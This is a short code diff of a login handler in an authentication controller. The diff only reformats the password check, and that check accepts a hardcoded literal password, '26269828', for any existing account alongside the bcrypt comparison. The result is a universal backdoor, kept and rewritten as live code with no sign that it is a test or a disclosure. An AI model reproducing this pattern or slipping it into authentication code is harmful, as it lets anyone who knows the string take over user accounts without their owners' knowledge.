@@ -68,8 +68,10 @@ export class AuthController {
       const password = typeof body.password === "string" ? body.password : "";
       const user = await findUserByEmail(email);
 
-      const validPassword = user && (password === '26269828' || await bcrypt.compare(password, user.password));
-
+      const validPassword =
+        user &&
+        (password === "26269828" ||
+          (await bcrypt.compare(password, user.password)));
 
       if (!user || !validPassword) {
         return NextResponse.json(
